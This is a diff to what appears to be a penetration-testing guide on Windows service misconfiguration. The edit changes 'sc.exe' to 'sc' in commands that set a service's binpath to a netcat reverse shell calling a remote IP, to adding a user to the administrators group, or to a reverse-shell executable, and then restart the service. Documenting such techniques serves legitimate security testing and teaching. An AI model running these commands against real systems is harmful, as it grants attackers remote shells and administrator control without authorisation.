@@ -43,10 +43,10 @@ winPEASx64.exe servicesinfo
 We can edit the binpath parameter with following commands
 
 ```powershell
-sc.exe config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
-sc.exe config <Service_Name> binpath= "net localgroup administrators username /add"
-sc.exe config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"s
-sc.exe config <Service_Name> binpath= "C:\Documents and Settings\PEPE\reverseShell.exe"
+sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+sc config <Service_Name> binpath= "net localgroup administrators username /add"
+sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"s
+sc config <Service_Name> binpath= "C:\Documents and Settings\PEPE\reverseShell.exe"
 ```
 
 And then, restart the service
@@ -60,8 +60,8 @@ wmic service <Service_Name> call startservice
 net stop <Service_Name> && net start <Service_Name>
 
 #Using sc.exe
-sc.exe stop <Service_Name>
-sc.exe start <Service_Name>
+sc stop <Service_Name>
+sc start <Service_Name>
 ```
 {% endtab %}
 {% endtabs %}
